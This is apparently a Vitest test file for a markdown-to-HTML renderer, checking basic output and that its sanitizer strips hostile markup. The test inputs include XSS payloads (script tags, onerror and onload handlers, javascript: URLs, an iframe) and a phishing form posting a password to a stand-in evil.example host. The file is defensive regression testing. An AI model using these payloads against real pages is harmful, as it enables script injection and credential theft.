import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

describe('renderMarkdown', () => {
  it('renders basic markdown to HTML', () => {
    const html = renderMarkdown('# Title\n\nSome **bold** text.')

    expect(html).toContain('<h1')
    expect(html).toContain('Title')
    expect(html).toContain('<strong>bold</strong>')
  })

  it('renders links and lists', () => {
    const html = renderMarkdown('- one\n- two\n\n[link](https://example.com)')

    expect(html).toContain('<li>one</li>')
    expect(html).toContain('<li>two</li>')
    expect(html).toContain('<a href="https://example.com" rel="noopener noreferrer">link</a>')
  })

  // Regression test for issue #27: unsanitized markdown/HTML input must
  // never reach the DOM with executable script or event-handler attributes.
  it('strips <script> tags from raw HTML embedded in markdown', () => {
    const html = renderMarkdown('# Title\n\n<script>alert("xss")</script>')

    expect(html).not.toContain('<script')
    expect(html).not.toContain('alert(')
  })

  it('strips inline event-handler attributes (onerror, onload, etc.)', () => {
    const html = renderMarkdown('<img src="x" onerror="alert(1)">')

    expect(html).not.toContain('onerror')
    expect(html).not.toContain('alert(1)')
  })

  it('strips javascript: URLs from links and images', () => {
    const html = renderMarkdown('[click me](javascript:alert(1))')

    expect(html).not.toContain('javascript:')
  })

  it('strips <iframe> and other dangerous tags entirely', () => {
    const html = renderMarkdown('<iframe src="https://evil.example"></iframe>')

    expect(html).not.toContain('<iframe')
  })

  it('neutralizes SVG-based XSS payloads', () => {
    const html = renderMarkdown('<svg onload="alert(1)"><script>alert(2)</script></svg>')

    expect(html).not.toContain('onload')
    expect(html).not.toContain('<script')
  })

  it('preserves plain text content while dropping malicious markup', () => {
    const html = renderMarkdown('Hello <img src=x onerror=alert(1)> world')

    expect(html).toContain('Hello')
    expect(html).toContain('world')
    expect(html).not.toContain('onerror')
  })

  it('returns an empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('')
  })

  // Regression test: DOMPurify's default config keeps <form>/<input>,
  // which without CSP form-action would let a hostile document render a
  // working phishing form inside the preview pane.
  it('strips <form> and form-control tags entirely', () => {
    const html = renderMarkdown(
      '<form action="https://evil.example/steal" method="post"><input name="pw"><button>Go</button></form>',
    )

    expect(html).not.toContain('<form')
    expect(html).not.toContain('<input')
    expect(html).not.toContain('<button')
    expect(html).not.toContain('evil.example')
  })

  it('adds rel="noopener noreferrer" to every link', () => {
    const html = renderMarkdown('[a](https://a.example) and [b](https://b.example)')

    expect(html).toContain('href="https://a.example" rel="noopener noreferrer"')
    expect(html).toContain('href="https://b.example" rel="noopener noreferrer"')
  })
})
